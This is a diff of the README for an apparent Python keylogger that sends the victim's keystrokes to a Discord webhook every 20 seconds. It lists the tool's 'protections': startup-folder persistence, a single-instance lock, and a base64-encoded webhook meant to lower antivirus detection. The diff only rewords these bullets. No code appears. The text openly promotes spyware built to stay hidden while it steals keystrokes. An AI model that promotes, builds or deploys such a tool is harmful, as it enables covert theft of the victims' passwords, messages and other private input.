@@ -5,11 +5,10 @@ It's packed with protections to ensure that it stays as undetected as possible.<
 All keypresses will be sent to your Discord Webhook every 20 seconds.<br>
 <br>
 <h2>Features & Protections</h2>
-> Creates a ".lockfile", preventing the program from running more than once and causing chaos.<br>
+> Prevents multiple instances from running to avoid chaos (improved!)<br>
 > Uses <a href="https://medium.com/velotio-perspectives/an-introduction-to-asynchronous-programming-in-python-af0189a88bbb">Asynchronous Programming</a> (asyncio) to ensure that no key is missed.<br>
-> Attaches itself to the startup folder.<br>
+> Attaches itself to the startup folder. (shell:starup)<br>
 > Requires BASE64 encoded webhook (reduces detections by ~10%).<br><br>
-> Currently working on a method to reduce detections more...
 <br>
 <h1>Setup & Usage</h1>
 1. Install Python (make sure to ADD PYTHON TO PATH)<br>
